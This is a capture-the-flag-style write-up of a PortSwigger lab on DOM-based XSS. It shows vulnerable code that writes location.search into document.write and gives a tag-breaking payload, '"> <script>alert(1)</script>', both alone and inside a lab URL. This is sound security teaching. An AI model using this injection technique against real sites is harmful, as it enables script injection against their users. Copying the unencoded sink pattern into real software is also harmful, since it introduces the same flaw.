# Lab: DOM XSS in `document.write` sink using source `location.search` - [Click](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)


### Vulnerability:

This lab has a **DOM-based XSS** vulnerability. The JavaScript on the page:

* Uses `location.search` as input (controlled by the attacker).
* Passes the value into `document.write()`, which writes raw HTML into the DOM without encoding.

```javascript
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    trackSearch(query);
}
```


We need to Trigger a JavaScript `alert()` popup by injecting a payload that gets written into the DOM and executed.

### Steps to Solve:

1. **Access the lab** and note the search input on the homepage.
2. Enter `hello` in the search bar. Observe:

   * The query is reflected in the page’s URL as `?search=hello`.
   * The value gets inserted into the HTML using `document.write()` without sanitization.
3. View the HTML using **Inspect Element** and find:

   ```html
   <img src="/resources/images/tracker.gif?searchTerms=hello">
   ```
4. Since it’s using `document.write()` unsafely, we can break the current tag and inject our own.


### Exploit Payload:

**Search parameter:**

```
"> <script>alert(1)</script>
```

**Full URL:**

```
https://<lab-id>.web-security-academy.net/?search="> <script>alert(1)</script>
```

**Effect:**

* Closes the `src` attribute with `">`
* Breaks out of the `<img>` tag
* Injects a new `<script>` tag with `alert(1)`
* `document.write()` renders this directly into the page → **XSS triggered**


An alert box pops up → **Lab Solved**
